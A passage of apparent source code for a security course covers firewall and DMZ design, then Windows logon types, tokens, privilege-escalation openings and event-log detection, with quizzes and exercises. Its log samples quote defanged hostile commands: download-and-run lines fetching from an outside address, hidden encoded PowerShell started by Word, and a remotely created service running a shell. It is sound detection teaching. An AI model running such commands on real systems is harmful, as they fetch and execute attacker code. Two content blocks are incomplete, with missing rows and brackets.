     ['The office still runs WEP, and a car idles outside for an hour','Key recovery against broken encryption','WEP falls to known weaknesses: move to WPA3.']
   ],'Analyze'),
   REFLECT('j6r','Place the sensor and the DMZ for a Hilo clinic','Hilo Lehua Clinic has one internet link, a patient portal web server, HILO-FS01 with patient records, staff laptops, guest Wi-Fi, and a backup NAS. Sketch the zones, then write one allow rule, with its port, for each pair of zones that needs one. Place one sensor: SPAN copy or inline, what it sees, and what it misses. Last, choose what that spot keeps, full capture or flow records, and for how long (<a href="#junior/j7">Review: the Full capture and flow record comparison in Read the wire</a>).'),
   QUIZ('j6q','Check: design choices',[
     ['Why does RtrA’s inbound edge ACL need <code>permit tcp any any established</code> while ufw on a server does not?',['ufw is faster','A router ACL is stateless, so replies need their own rule; ufw tracks connections','established opens every port','Routers cannot filter TCP'],1,'established matches packets with ACK or RST set, the replies; a stateful filter passes replies by itself.',{whys:['Speed is beside the point; the difference is connection tracking.','A stateless ACL judges each packet alone, so a reply looks like any other inbound packet and needs its own rule; ufw remembers the outbound connection and lets its replies back in.','established matches replies with ACK or RST set, rather than opening every port.','Routers filter TCP all the time; this very rule filters it.'],imp:'good',c:'net-firewall-design'}],
     ['The web shop in the DMZ is compromised. Which rule limits the damage most?',['Allow DMZ → inside, any','Deny DMZ → inside, except the app server to the database on 5432','Allow inside → DMZ, any','Move the shop into the LAN'],1,'One host and one port leaves an intruder one narrow path, which a sensor can watch.',{whys:['Allowing DMZ to inside on any port hands the intruder the whole inside network.','One host and one port leaves the intruder a single narrow path that a sensor can watch.','This rule covers traffic from the inside out, and the danger is the DMZ reaching in.','Moving the compromised shop into the LAN puts the intruder next to everything else.'],imp:'core',c:'net-firewall-design'}],
     ['A new inline IPS rule goes live, and the Hilo office loses its payroll site. What do you check first?',['The payroll vendor’s server','The IPS’s recent blocks for that rule; return it to alert-only, tune it, then block again','The guest Wi-Fi','The DNS cache'],1,'Inline sensors can drop real traffic on a false positive, so new rules start in alert-only mode.',{whys:['The trouble started right when the new rule went live, so the IPS is the first suspect.','The new rule is the change, so check its blocks, return it to alert-only, tune it, and then block again.','Guest Wi-Fi is a separate network, apart from the payroll path.','The timing points at the new IPS rule rather than the DNS cache.'],imp:'good',c:'det-ids-ips'}],
     ['A clinic laptop’s trust store holds “Hotspot Inspection Root”, added last week. Why is that serious?',['Roots expire quickly','Whoever holds its private key can sign a certificate for any name, and this laptop trusts it','It slows browsing','Roots matter only for email'],1,'Remove an unexpected root and find how it arrived. <a href="#freshman/f10">Review: Keys, locks, and certificates</a>',{whys:['Root certificates usually last for years.','A root signs for every name, so whoever holds this one can mint a certificate for any site, and the laptop accepts it without a warning.','Speed is beside the point; the danger is who the laptop now trusts.','Roots vouch for websites, email, and software alike.'],imp:'core',c:'crypto-certificates'}],
     ['A VPN log shows keola connected from Hilo and, ten minutes later, from another country. What do you suspect, and what blunts it?',['Normal roaming; nothing','A stolen password; MFA on VPN sign-ins, and a tunnel that lands in a limited segment','A slow link; split tunneling','DNS poisoning; DNSSEC'],1,'Nobody travels that fast, and a VPN admits anyone holding the credentials.',{whys:['Nobody travels between countries in ten minutes, so this is far from normal roaming.','Impossible travel points to a stolen password, and MFA plus a limited landing segment blunt it.','A slow link slows the session, rather than moving it to another country.','DNS poisoning misdirects lookups and leaves VPN sign-in locations alone.'],imp:'core',c:'net-vpn'}],
     ['Site A and Site B will join across the internet instead of a leased WAN line. Which fits?',['A remote-access VPN on every PC','A site-to-site IPsec VPN between the edge routers, IKEv2 with certificates, in tunnel mode','HTTPS on every server','A shared guest SSID'],1,'Two networks, always on, without user action: site-to-site.',{whys:['A remote-access VPN joins one laptop, so every PC would need its own tunnel.','Two networks joined always on, without user action, is a site-to-site IPsec VPN between the edge routers.','HTTPS protects sessions to single servers, rather than joining two whole networks.','A guest SSID is local Wi-Fi and stays at one site.'],imp:'good',c:'net-vpn'}],
     ['The DMZ rules allow TCP 21, 23, and 443 from the internet to the web shop. Customers use HTTPS, and staff upload files. What should remain?',['21, 23, and 443','443 from the internet, and SFTP on 22 from the office only','23 and 443','Every port, behind an IPS'],1,'FTP and Telnet send passwords in clear text; SFTP rides SSH, and only staff need it. <a href="#sophomore/s4">Review: Services and ports</a>',{whys:['FTP on 21 and Telnet on 23 send passwords in clear text, open to the whole internet.','Customers need 443, and staff uploads move to SFTP on 22, open to the office alone.','Telnet on 23 is a clear-text remote shell that nobody here needs.','An IPS watches traffic, and every open port still widens the attack surface.'],imp:'core',c:'net-protected-protocols'}],
     ['Which layers do these read: a stateless ACL, port security, and an NGFW’s application ID?',['7, 2, and 3','3 and 4, then 2, then 7','2, 3, and 4','All at layer 7'],1,'An ACL reads addresses (3) and ports (4), port security reads MACs (2), and application ID reads the application (7). <a href="#freshman/f7">Review: Networking fundamentals and Cisco basics</a>',{whys:['That order is scrambled: the ACL reads 3 and 4, port security 2, and application ID 7.','An ACL reads addresses (3) and ports (4), port security reads MACs (2), and application ID reads the app (7).','Port security alone reads layer 2, and application ID reads all the way up at 7.','Application ID alone reads layer 7; the ACL and port security work lower down.'],imp:'good',c:'net-firewall-design'}],
     ['A rogue DHCP offer and a forged ARP reply both come from one access port. Which switch features stop both, and how do they work together?',['Port security and PortFast','DHCP snooping builds the binding table, and dynamic ARP inspection checks ARP replies against it','BPDU guard and storm control','Trunking and nonegotiate'],1,'Snooping learns which MAC holds which IP on which port; DAI drops any reply that disagrees. <a href="#junior/j4">Review: Cisco: VLANs, routing, and ACLs</a>',{whys:['Port security caps MACs and PortFast speeds start-up, so DHCP offers and ARP replies pass unchecked.','Snooping records which MAC holds which IP on which port, and DAI drops ARP replies that disagree.','BPDU guard and storm control guard against loops and floods, so DHCP offers and ARP replies pass unchecked.','Trunk settings govern VLAN tags, so DHCP offers and ARP replies pass unchecked.'],imp:'core',c:'threat-network-attacks'}],
     ['The team must answer “who reached the web shop last quarter?” and “what crossed during last night’s alert?” What should the sensor keep?',['Full capture for both','Flow records for months, and full capture for days around alerts','Only the IDS alerts','The ARP cache'],1,'Flows reach back months cheaply; a capture proves the contents for the days it is kept. <a href="#junior/j7">Review: Read the wire: captures, flows, and network attacks</a>',{whys:['Full capture for a whole quarter would be enormous, so it rarely stretches that far.','Flows reach back months cheaply, and capture proves the contents for the days around an alert.','Alerts alone leave out the everyday traffic that answers who reached the shop.','The ARP cache holds local MAC addresses for minutes.'],imp:'good',c:'det-captures'}],
     ['Which change makes clients ignore forged deauth frames?',['Hiding the SSID','WPA3, which requires Protected Management Frames','MAC filtering','A stronger signal'],1,'PMF (802.11w) authenticates disconnect frames, so forged ones are dropped, and WPA3 makes PMF mandatory.',{whys:['A hidden SSID still appears in clients’ probes, and deauth frames keep working.','WPA3 requires Protected Management Frames, which authenticate disconnect frames so forged ones are dropped.','MAC filtering decides who joins, and forged deauth frames still land.','A stronger signal reaches farther, and forged frames still land.'],imp:'good',c:'threat-wireless-attacks'}]
   ]),
   LINKS('Go further',['nist-800-41','nist-800-77','wfa-security'])
   ]},
 {id:'j8',title:'Windows: logons, tokens, and the event trail',bloom:'Analyze',sum:'Read logon types, tokens, process logs, script logs, and domain controller sign-in events to tell normal Windows activity from misuse, and see why forwarded logs survive an intruder.',
  can:'read logon types, tokens, process and script logs, and domain controller events to tell normal Windows activity from misuse',
  blocks:[
   C('Read the trail rather than one event','Analyze',
     P('Honua Logistics runs one domain: KONA-DC01 checks every password, HONUA-SRV1 holds the shared files, and dispatchers work at PCs such as KAILUA-WS07. <a href="#sophomore/s10">Read the logs</a> taught the IDs one at a time; this unit reads them as a story. For every event ask four questions: <b>who</b> (the account), <b>how</b> (logon type and authentication package), <b>from where</b> (source address and parent process), and <b>when</b> (in UTC, against working hours).'),
     HIER('Which Windows log holds it',
      {name:'Event Viewer',note:'<code>Get-WinEvent -LogName</code> takes the log names at the tips of this tree',tone:'muted',children:[
       {name:'Windows Logs',tone:'l4',children:[
        {name:'Security',note:'4624, 4625, 4672, 4688, 4720, 4732, 1102, 4698 (scheduled task created, once Other Object Access Events records Success, which is off by default), and 4697 (service installed: the Security-log twin of 7045, naming the account that installed it, once Security System Extension records Success); 4776 on the computer that owns the account (a DC for a domain account, the PC itself for a local one, once Credential Validation is audited); on a DC also 4768, 4769, and 4771',tone:'l3'},
        {name:'System',note:'7045 service installed; 104 another log cleared',tone:'l3'}]},
       {name:'Applications and Services Logs',tone:'l2',children:[
        {name:'Microsoft-Windows-PowerShell/<wbr>Operational',note:'4104 script block',tone:'l1'},
        {name:'Microsoft-Windows-Sysmon/<wbr>Operational',note:'1 process created, with hashes; 3 network connection; 10 one process opened another (an odd program opening lsass.exe, the process that holds sign-in secrets, marks a credential read)',tone:'l1'},
        {name:'Microsoft-Windows-Windows Defender/<wbr>Operational',note:'1116 malware detected; 1117 action taken',tone:'l1'},
        {name:'Microsoft-Windows-TaskScheduler/<wbr>Operational',note:'106 task registered and 200 action started; off until <code>wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true</code> turns it on',tone:'l1'},
        {name:'Microsoft-Windows-TerminalServices-<wbr>RemoteConnectionManager/<wbr>Operational',note:'1149 Remote Desktop network sign-in passed, just before the 4624 type 10',tone:'l1'}]}]},
      {intro:'Pick the log before the query: an ID searched in the wrong log returns nothing.',
       caption:'<b>Sysmon</b>, free from Microsoft, adds file hashes, parent command lines, and network connections; a configuration file decides what it records.'})),
   DETAIL('Where to get Sysmon',
     P('Sysmon comes as a Sysinternals download, and on current Windows 11 as a built-in optional feature that is off by default.')),
   ANATOMY('One successful sign-in (4624)',[
     {name:'Event 4624',tag:'Security log, HONUA-SRV1',tone:'l2',children:[
      {name:'Who and when',tone:'l3',children:[
       {name:'TimeCreated',text:'2026-10-21T19:02:11Z'},
       {name:'Account',text:'HONUA\\pua'},
       {name:'Logon ID',text:'0x3E7A2F1: joins this session’s later 4672 and 4688 events'}]},
      {name:'How and from where',tone:'amber',children:[
       {name:'Logon Type',text:'3: over the network, here a file share'},
       {name:'Source Network Address',text:'10.0.5.31, with Workstation Name KAILUA-WS07'},
       {name:'Process',text:'Logon Process Kerberos; Process Name - for a network sign-in'},
       {name:'Authentication Package',text:'Kerberos'}]}]}
     ],{facts:{head:['Authentication Package','Read it as'],rows:[
       ['Kerberos','Normal for a domain account reaching a server by name'],
       ['NTLM (NTLM V2)','A name, clock, or SPN was missing, or the account is local: find out which'],
       ['NTLM V1 or LM','An old format that cracks fast: refuse it in policy']]},
      note:'19:02:11Z is 9:02 AM in Hawaiʻi (UTC−10). <b>Elevated Token: Yes</b> and a 4672 with the same Logon ID mark an admin-level session. Package names come from <a href="#junior/j1">NTLM and Kerberos</a>.',bloom:'Analyze'}),
   COMPARE('Logon types that matter',[
     {name:'At the machine',tone:'l2',rows:[
       ['2 Interactive','A dispatcher signs in at the keyboard. Look closer: type 2 on a DC or server by an account outside Administrators'],
       ['7 Unlock','Back from lunch. Look closer: an unlock outside the user’s hours, without a type 2 sign-in earlier that day'],
       ['11 Cached','A laptop signs in off the network. Look closer: a desktop that always has a DC in reach']]},
     {name:'Over the network',tone:'l3',rows:[
       ['3 Network','Opening a share or WinRM. Look closer: a local account arriving by NTLM from another workstation'],
       ['8 Cleartext','A web app with basic sign-in. Look closer: any type 8 on a site without HTTPS'],
       ['9 New credentials','<code>runas /netonly</code> by IT. Look closer: borrowed credentials on a staff PC'],
       ['10 Remote Desktop','IT from the admin network. Look closer: a service account, or a session from another workstation']]},
     {name:'Run by Windows',tone:'muted',rows:[
       ['4 Batch','A scheduled backup task. Look closer: a new task under a person’s account'],
       ['5 Service','Services starting at boot. Look closer: a service account nobody created on purpose']]}
   ],{intro:'The logon type in a 4624 or 4625 says how the sign-in happened. <a href="#sophomore/s10">Read the logs</a> named the common ones.',bloom:'Analyze'}),
   MATCH('j8m','Logon type to scenario','Tap a logon type on the left, then the scenario that writes it.',[
     ['2','keola signs in at the front-desk keyboard','Type 2, Interactive: a password typed at the PC’s own keyboard.'],
     ['3','A PC opens \\\\HONUA-SRV1\\dispatch','Type 3, Network: reaching a share signs in across the network without opening a desktop.'],
     ['4','A scheduled task runs the nightly backup script','Type 4, Batch: a scheduled task signs in to run its job with nobody at the keyboard.'],
     ['5','The print spooler starts at boot','Type 5, Service: Windows signs in the account a service runs under, such as the spooler’s, as the service starts.'],
     ['7','pua returns from lunch and unlocks her screen','Type 7, Unlock: pua’s session was already open, so the lock screen only confirms it is her.'],
     ['9','IT runs a tool with <code>runas /netonly</code>','Type 9, New credentials: the tool keeps the local session and uses the other account only on the network.'],
     ['10','IT connects with Remote Desktop','Type 10, Remote Desktop: a full desktop session from another machine.'],
     ['11','A laptop signs in at home without the office network','Type 11, Cached: with no DC in reach, Windows checks the domain sign-in it saved earlier.']
   ],'Analyze'),
   C('Tokens, privileges, and the climb to admin','Analyze',
     ANATOMY('Reading whoami /all',[
      {name:'whoami /all',tag:'kekoa, IT help desk, a local admin on KAILUA-WS07',tone:'l2',children:[
       {name:'User',tone:'l1',text:'HONUA\\kekoa S-1-5-21-…-1107: the same SID in both windows'},
       {name:'Groups',tone:'l3',text:'BUILTIN\\Administrators: <b>Group used for deny only</b> in the normal window; <b>Enabled group</b> once elevated'},
       {name:'Privileges',tone:'amber',text:'Normal: five, such as SeChangeNotifyPrivilege. Elevated: about two dozen, adding SeDebugPrivilege, SeBackupPrivilege, and SeImpersonatePrivilege'},
       {name:'Integrity label',tone:'l4',text:'Mandatory Label\\Medium Mandatory Level, or High once elevated'}]}
     ],{facts:{head:['','Filtered token','Elevated token'],rows:[
       ['Made','At sign-in; runs the desktop','At sign-in too, linked; used only after the UAC prompt'],
       ['Administrators','Deny only','Enabled'],
       ['Integrity','Medium','High'],
       ['4688 shows','Token Elevation Type %%1938','%%1937']]},
      intro:'At sign-in Windows builds an access token: the user’s SID, group SIDs, privileges, and an integrity level. Each process carries a copy, and UAC gives an admin two.',
      note:'A privilege listed as <b>Disabled</b> is still held: the program can switch it on. SYSTEM runs at System integrity, above High.'}),
     TIPS('<b>Privilege escalation</b> turns a limited token into an admin or SYSTEM one (vertical), or takes over a peer’s account at the same level (horizontal). On Windows it nearly always rides a loose setting a defender can find first.',
          '<b>The openings:</b> a service or scheduled task whose program or folder Users can modify (<code>icacls</code> shows Users:(M) or (F); <a href="#sophomore/s2">Windows 11 hardening</a>); an unquoted service path with spaces when Users can write to a folder along it; AlwaysInstallElevated set to 1 under both HKLM and HKCU; saved credentials in <code>cmdkey /list</code>; and UAC turned off, so every program an admin starts runs elevated.',
          '<b>SeImpersonatePrivilege</b> is normal for IIS, SQL Server, and other service accounts, so code that breaks into those services can reach SYSTEM: patch them, and keep them on accounts that hold nothing else.',
          '<b>The evidence:</b> a 4672 for an account that should hold no admin rights, a 4732 adding someone to Administrators, or a 4688 whose creator is w3wp.exe or sqlservr.exe and whose new process is cmd.exe or powershell.exe, worse still when Mandatory Label reads System.')),
   QUIZ('j8ck1','Check yourself',[
     ['whoami /all in kekoa’s normal window lists BUILTIN\\Administrators as Group used for deny only and Medium Mandatory Level. What does that mean?',['kekoa is not an admin','The token is broken','kekoa is an admin, running his filtered token','kekoa is SYSTEM'],2,'UAC strips admin power until the prompt; the elevated window shows Enabled group and High.',{whys:['Deny only means the group is present and held back until elevation, so kekoa is an admin.','This is UAC’s normal filtered token, the everyday state for an admin.','Deny only plus Medium is UAC’s filtered token: the admin group is present yet held back until kekoa approves a prompt.','SYSTEM runs at System integrity, above High, and this token reads Medium.'],imp:'core',c:'win-uac'}]
   ]),
   COMPARE('Brute force and password spray on the domain controller',[
     {name:'Brute force',tone:'amber',rows:[
       ['Names tried','One'],
       ['Failures per name','Many, often fast'],
       ['Lockout','Trips it: a 4740 on the DC, then 4625s with 0xC0000234 on the server that received the tries'],
       ['Shape on the DC','A run of failures for one name']]},
     {name:'Password spray',tone:'bad',rows:[
       ['Names tried','Many, often the whole staff list'],
       ['Failures per name','One or two, spaced out'],
       ['Lockout','Stays under the threshold: no 4740'],
       ['Shape on the DC','Often one client across many names. A careful spray spreads over many addresses and hours, so also count distinct names failing per hour, across all sources']]}
   ],{intro:'<a href="#sophomore/s10">Read the logs</a> sorted the two by 4625s on one PC. In a domain the DC sees every attempt, whichever server received it.',
     note:'Both show as 4771 0x18 (Kerberos) or 4776 0xC000006A (NTLM); 4768 0x6 marks a name that does not exist. Lockout stops brute force and misses a spray. MFA, a banned-password list, and an alert on many names failing catch both.',bloom:'Analyze'}),
   QUIZ('j8ck2','Check yourself',[
     ['KONA-DC01 shows 4771 failure code 0x18 for 40 different accounts in an hour, all from 10.0.5.77, and no 4740. Which pattern?',['Brute force on one account','A clock problem','Normal sign-ins','A password spray from 10.0.5.77'],3,'0x18 means a bad password. Isolate 10.0.5.77 and check those accounts for a 4624.',{whys:['Brute force hammers one name, and this shows 40 names.','A clock problem shows as ticket errors, while 0x18 means a bad password.','Forty bad passwords in an hour from one address sits far outside normal.','Many names, one source, and no lockout make a password spray.'],imp:'core',c:'det-windows-events'}]
   ]),
   C('Built-in tools and the code Windows allows','Analyze',
     COMPARE('Normal and suspicious use of built-in tools',[
      {name:'certutil',tone:'l1',rows:[['Usual parent','An admin’s cmd or PowerShell'],['Usual path','C:\\Windows\\System32'],['Warning sign','-urlcache or any URL; writing into Public, Temp, or AppData']]},
      {name:'rundll32',tone:'l2',rows:[['Usual parent','explorer.exe or svchost.exe'],['Usual path','System32, with a DLL from System32'],['Warning sign','A DLL in AppData, Temp, or Public; no arguments at all; a parent of Word or Excel']]},
      {name:'mshta',tone:'amber',rows:[['Usual parent','Almost never runs in an office'],['Usual path','System32'],['Warning sign','A URL or script text on its command line; an outbound connection']]},
      {name:'bitsadmin',tone:'l3',rows:[['Usual parent','An old setup script'],['Usual path','System32'],['Warning sign','/transfer from an outside host; a notify command that starts a program when a job ends']]}
     ],{intro:'Attackers prefer programs Windows already trusts, so the program name proves nothing. Read the parent, the path, and the command line in the 4688 or Sysmon event 1.',
       note:'Excerpts on this page defang addresses (hxxp, .example) and cut arguments short: read them, never run them.'}),
     TERM('Sysmon event 1, KAILUA-WS07 (trimmed): one tool on two days\nImage:        C:\\Windows\\System32\\certutil.exe\nCommandLine:  certutil -hashfile C:\\Users\\pua\\Downloads\\setup.msi SHA256\nParentImage:  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser:         HONUA\\adm_keola\n\nImage:        C:\\Windows\\System32\\certutil.exe\nCommandLine:  certutil -urlcache -f hxxp://203.0.113.80/… C:\\Users\\Public\\…\nParentImage:  C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nUser:         HONUA\\pua'),
     P('The first is IT checking a download’s hash. The second fetches from an outside address into Public, started by Word under a dispatcher’s account: three warning signs in one event.'),
     P('Windows stops untrusted code three ways; <a href="#senior/se8">Windows: allow only what you trust</a> weighs them.'),
     TIPS('<b>Application control</b> (App Control for Business, formerly WDAC, and AppLocker) allows programs by publisher signature, path, or hash.',
          '<b>Attack surface reduction (ASR) rules:</b> <i>Block all Office applications from creating child processes</i> stops Word from starting PowerShell.',
          '<b>SmartScreen:</b> a file with the Mark of the Web, ZoneId=3 (<a href="#sophomore/s2">Windows 11 hardening</a>), gets a reputation check, and an unknown program gets the warning.',
          '<b>Signatures help the read.</b> <code>Get-AuthenticodeSignature</code> on certutil.exe reads Valid, signed by Microsoft Windows; a program dropped in C:\\Users\\Public that reads NotSigned has no publisher to trust.')),
   DETAIL('Application control and PowerShell',
     P('In enforce mode, application control also puts untrusted PowerShell into Constrained Language Mode (<a href="#junior/j2">Group Policy</a>).')),
   C('Hidden commands: decode, never run','Analyze',
     TERM('4688, KAILUA-WS07, Process Command Line:\npowershell.exe -nop -w hidden -enc dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==\n\nDecoded as text, never run:\nPS> [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'dwBoAG8AYQBtAGkAIAAvAGEAbABsAA==\'))\nwhoami /all'),
     TIPS('<b>-enc</b> (-EncodedCommand) takes base64 of UTF-16LE text; every other byte is zero, so many A characters repeat. On Linux, <code>base64 -d</code> then <code>iconv -f UTF-16LE</code> reads it.',
          '<b>Other disguises (obfuscation):</b> random capital letters, words split and glued back (\'Down\'+\'load\'), backticks inside keywords, and -nop -w hidden to skip the profile and hide the window. Admin scripts rarely need any of these, so the disguise itself is a finding.',
          '<b>Script block logging sees through most of them:</b> the 4104 holds the decoded -enc text and any code built at run time and then run; AMSI scans that same text. Concatenation inside one block still shows as written, so read it slowly.')),
   DETAIL('A readable admin command beside a disguised one',
     COMPARE('A readable admin command and a disguised one',[
      {name:'Readable admin command',tag:'4104, HONUA-SRV1',tone:'ok',rows:[
        ['Command','<code>Get-Service</code> <code>| Where-Object</code> <code>Status -eq Stopped</code>'],

      {name:'Disguised command',tag:'4688, a dispatch PC',tone:'bad',rows:[

   PATH('Events that survive a log clear',[
     {name:'Workstation',tag:'KAILUA-WS07',tone:'l1',note:'Writes each event locally',via:'Windows Event Forwarding'},

     {name:'SIEM',tag:'alerts and search',tone:'l3',note:'Rules fire on 1102 and 104, and on silence from a PC that should be talking'}
   ],{intro:'An intruder can wipe local logs; forwarded copies survive. On busy servers, raise the Security log size above its 20 MB default (<a href="#sophomore/s2">Windows 11 hardening</a> shows the wevtutil line).',
     note:'<b>Forward first:</b> 4624 and 4625, 4672, 4688, 4698, 4720, 4732, 1102 and 104, 7045, 4104, and Sysmon 1 and 3. Forward the tampering events below too.',
     caption:'Clearing erases only the local copy. The 1102 event it leaves behind reaches the collector and should raise an alert.',bloom:'Analyze'}),
   TIPS('<b>1100:</b> the event logging service shut down.',
        '<b>4719:</b> audit policy changed, written even while Audit Policy Change is off.',
        '<b>4616:</b> system time changed, which can push events outside a time-window search.',
        '<b>5025:</b> the firewall service stopped.',
        '<b>4704:</b> a user right assigned, such as Debug programs, once Authorization Policy Change is audited.'),
   QUIZ('j8ck3','Check yourself',[
     ['The System log on KAILUA-WS07 shows 104: Microsoft-Windows-PowerShell/Operational was cleared at 12:50, minutes after a 4104 Warning. What next?',['Read the forwarded copy on the collector','Nothing: the log is empty now','Turn script block logging off','Read the local log again with Get-WinEvent'],0,'The 104 is itself evidence that someone hid script activity: treat it as part of the incident.',{whys:['The forwarded copy on the collector survived the local clear.','The 104 itself is evidence, and a copy elsewhere still holds the story.','Turning logging off blinds you and helps whoever cleared the log.','The clear erased the local copy, so Get-WinEvent finds nothing there.'],imp:'core',c:'host-audit-logging'}]
   ]),
   SPOT('j8sp','Spot the misuse: one day on KAILUA-WS07','Times in HST. pua works the dispatch desk 7:30 to 5:00; IT manages PCs over WinRM from 10.0.5.10 with the admin account adm_keola. Tap every line that shows misuse, then Check.',[
     ['03:12:40 1149 Remote Desktop sign-in passed: svc_backup from 203.0.113.50','The Remote Desktop gate let svc_backup in from an outside address seconds before its type 10 sign-in: one intrusion seen in two logs. Disable the account and close RDP to the internet.'],
     ['03:12:44 4624 type 10  svc_backup     from 203.0.113.50','The type 10 that follows the 1149: same account, same outside address.'],
     ['07:31:02 4624 type 2   pua            from -',null],
     ['07:31:05 4688 explorer.exe > C:\\Program Files\\HonuaDispatch\\dispatch.exe',null],
     ['09:05:12 4624 type 3   adm_keola      from 10.0.5.10',null,'IT manages PCs over WinRM from 10.0.5.10 with adm_keola, so a type 3 sign-in from there is routine.'],
     ['09:05:13 4104 Get-Service | Where-Object Status -eq Stopped',null,'Script block logging records every block; listing stopped services is ordinary admin work in that WinRM session.'],
     ['12:47:30 4688 WINWORD.EXE > powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A…','Word starting hidden PowerShell with an encoded command: a booby-trapped document. The ASR rule against Office child processes stops this.'],
     ['12:47:31 4104 Warning: IEX (New-Object Net.WebClient).DownloadString(\'hxxp://203.0.113.80/…','The decoded script downloads text from an outside address and runs it in memory.'],
     ['12:47:36 4688 powershell.exe > rundll32.exe C:\\Users\\pua\\AppData\\Local\\Temp\\…','rundll32 loading a DLL from Temp, started by that PowerShell: the payload running under a trusted name.'],
     ['13:15:20 4624 type 3   KAILUA-WS07\\Administrator  NTLM  from 10.0.5.44','The local Administrator signing in over the network from another workstation: a shared local password at work. Windows LAPS makes each one unique.'],
     ['13:16:02 4624 type 7   pua            from -',null,'Type 7 is an unlock: pua back at her own desk during her shift.']
   ]),
   QUIZ('j8q','Check: the event trail',[
     ['A 4698 on KAILUA-WS07 at 02:14 shows task \\Microsoft\\Windows\\UpdateCheck with the action C:\\Users\\Public\\upd.exe, created by adm_keola. <code>Get-AuthenticodeSignature</code> on upd.exe reads NotSigned. What fits best?',['A normal Windows task, since it sits under \\Microsoft\\Windows\\','A failed update to retry','A backup job','Persistence dressed as a Windows task'],3,'Check adm_keola’s 4624s around 02:14, then remove the task. <a href="#sophomore/s2">Review: Windows 11 hardening</a>',{whys:['The folder name is only a label; Windows’ own tasks run signed programs from System32.','An update runs a signed program from a Windows folder, and this one is unsigned in Public.','A backup job runs a known, signed tool, and this program has no publisher.','An unsigned program in Public behind a Windows-looking name is persistence in disguise.'],imp:'core',c:'host-malware-persistence'}],
     ['HONUA-SRV1 logs a 4624 type 3 from KAILUA-WS07, then this 7045 in the System log:<br><code>service WinSvcHost, image %COMSPEC% /c powershell -nop -w hidden -enc …</code><br>What happened?',['A service created remotely over the admin shares','A routine Windows update','A Remote Desktop session','A scheduled backup'],0,'Type 3 plus a new service whose image is a shell command is remote service creation. Find the account in that 4624, ask why it holds admin rights on HONUA-SRV1, keep server admin rights to separate admin accounts, and keep local admin passwords unique with LAPS. <a href="#junior/j2">Review: Group Policy</a>',{whys:['A network sign-in followed by a new service that runs a shell is remote service creation.','Updates install signed services rather than a hidden, encoded PowerShell command.','Remote Desktop logs type 10, and this sign-in is type 3.','A scheduled backup runs as a task, while this is a brand-new service running a shell.'],imp:'core',c:'det-windows-events'}],
     ['On KONA-DC01, which event shows a user asking for a ticket to reach the file server?',['4768','4769','4771','4776'],1,'Sign-in gets a ticket-granting ticket (4768); each service, such as cifs/HONUA-SRV1, then needs its own service ticket (4769).',{whys:['4768 is the ticket-granting ticket at sign-in, before any service is named.','4769 records a service ticket for one named service, such as the file server.','4771 records a failed Kerberos pre-authentication at sign-in, before any ticket for a service is requested.','4776 records an NTLM password check, outside Kerberos.'],imp:'core',c:'win-kerberos'}],
     ['KONA-DC01 logs a 4776 for pua from KAILUA-WS07 each time a mapped drive reconnects. The drive maps to \\\\10.0.5.20\\dispatch. Why NTLM?',['pua’s password expired','The DC is offline','The IP address path has no SPN, so Kerberos cannot be used','Kerberos is turned off'],2,'Map by name (\\\\HONUA-SRV1\\dispatch) and Kerberos takes over. <a href="#junior/j1">Review: Windows Server and Active Directory</a>',{whys:['An expired password fails the sign-in, while this drive reconnects each time.','The DC answered with a 4776, so it is online.','Kerberos asks for a ticket by SPN, and a path by IP address has none.','Kerberos works for the rest of the domain; this one path falls back.'],imp:'good',c:'win-kerberos'}],
     ['A 4624 type 10 for svc_backup shows <code>SystemTime="2026-10-21T13:12:44Z"</code>. What time was it on KAILUA-WS07?',['03:12:44 on 21 October','23:12:44 on 21 October','13:12:44 on 21 October','04:12:44 on 21 October'],0,'Subtract 10 hours, all year. A service account by Remote Desktop at 3 a.m. deserves a look. <a href="#sophomore/s10">Review: Read the logs</a>',{whys:['Hawaiʻi is UTC−10, so 13:12 UTC is 03:12 local time.','23:12 adds 10 hours; Hawaiʻi runs behind UTC, so subtract.','13:12 is the UTC time itself, before converting.','04:12 subtracts 9 hours; Hawaiʻi is 10 hours behind all year.'],imp:'good',c:'det-windows-events'}],
     ['A 4688 shows WINWORD.EXE starting rundll32.exe with a DLL in AppData\\Local\\Temp. Which control blocks this before it runs?',['Execution policy','Script block logging','SmartScreen','The ASR rule against Office child processes'],3,'ASR rules stop the parent-child pair; application control would also refuse an unknown DLL.',{whys:['Execution policy governs .ps1 files, and this is Word starting rundll32.','Script block logging records PowerShell text and blocks nothing.','SmartScreen checks downloaded files at launch rather than a child that Word starts.','Word starting rundll32 is an Office child process, and this ASR rule blocks that pair before the DLL loads.'],imp:'core',c:'win-app-control'}],
     ['A 4688 on HONUA-SRV1 reads: Creator Process Name C:\\Windows\\System32\\inetsrv\\w3wp.exe; New Process Name C:\\Windows\\System32\\cmd.exe; Mandatory Label System Mandatory Level. What does it show, and what comes first?',['Horizontal escalation: a dispatcher took over a peer’s account; reset that password','Vertical escalation from the web app’s service account, which holds SeImpersonatePrivilege: isolate the server, patch the app, and keep that account free of other rights','Normal IIS work: app pools start cmd.exe at System level for upkeep','An admin approved a UAC prompt, so nothing needs doing'],1,'The IIS worker’s shell runs at System, above the app pool account’s level: a vertical climb.',{whys:['Horizontal means taking a peer’s account; here a service climbed to System.','The web worker reached System integrity, a vertical climb through SeImpersonatePrivilege.','App pools serve pages; a System shell from w3wp.exe is a classic sign of a break-in.','UAC prompts appear for people at a desktop, while w3wp.exe runs as a service.'],imp:'core',c:'host-process-trees'}]
   ]),
   LINKS('Go further',['ms-ad-events','ms-wef','ms-ps-logging','ms-sysint','ms-win-sec'])
